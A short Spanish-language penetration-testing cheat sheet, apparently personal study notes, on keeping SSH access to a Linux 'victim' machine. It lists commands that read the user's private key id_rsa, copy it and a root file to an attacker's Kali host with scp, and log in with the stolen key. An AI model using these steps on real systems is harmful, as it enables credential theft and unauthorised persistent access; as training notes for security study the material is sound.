# Escalación de privilegios en Linux

Tags: #Linux #PrivEsc #Persistence 

## Persistencia Vía SSH (Keys)

```bash 
# Podemos obtener la clave ssh privada dentro de la maquina victima 
❯ ls -la                   # Mirar todo el contenido del directorio incluyendo el oculto en donde encontraremos '.ssh'

❯ cd .ssh/                 # Ingresamos al directorio 'ssh' del usuario y en el observamos dos archivos 'authorized_keys, id_rsa'
	# id_rsa = Clave privada 
❯ cat id_rsa               # Nos copiamos el contenido de la llave privada


# Comando en nuestra maquina de atacante
❯ scp user@IP:/root/file.txt /home/kali
❯ scp <username>@<IP:~/.ssh/id_rsa .>      # Nos ayuda a transferir archivos desde la maquina victima a nuestro kali
	# . = Le decimos que el archivo a descargar nos lo deje en la ruta en donde estamos 
❯ chmod 400 id_rsa          # Debemos de darle permisos para poder usar la llave privada 


❯ ssh -i id_rsa <username>@<IP>  # Para hacer la conexion por SSH con la llave privada 
```